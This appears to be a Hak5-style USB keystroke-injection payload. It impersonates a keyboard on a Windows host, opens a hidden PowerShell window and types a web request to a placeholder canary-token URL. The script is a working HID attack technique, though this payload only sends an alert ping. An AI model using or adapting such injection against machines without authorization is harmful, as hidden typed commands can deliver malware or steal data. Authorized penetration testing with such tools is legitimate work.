#!/bin/bash
# hak5_canary_duck (Windows host, HID) — pings a canarytokens.com URL to
# alert you when the target machine is accessed.
# BEFORE USE: replace YOUR_CANARY_URL with your canary token URL from
# https://canarytokens.com (HTTP token).
# Authorized tests only.
LED SETUP
ATTACKMODE HID
sleep 3
LED STAGE1
if [ ! -c /dev/hidg0 ]; then
    echo "[!] /dev/hidg0 missing - no host attached"
    LED R SINGLE; sleep 1; LED OFF; LED FINISH; exit 1
fi
QUACK "REM hak5_canary_duck — authorized tests only" \
    "REM *** REPLACE YOUR_CANARY_URL BELOW ***" \
    "DELAY 1000" \
    "GUI r" "DELAY 100" \
    "STRING powershell -windowstyle hidden" "ENTER" "DELAY 1000" \
    "STRING Invoke-WebRequest -Uri \"YOUR_CANARY_URL\" -UseBasicParsing | Out-Null" "ENTER" "DELAY 500" \
    "STRING exit" "ENTER"
echo "[+] canary_duck injected — canary token pinged"
LED FINISH
exit 0
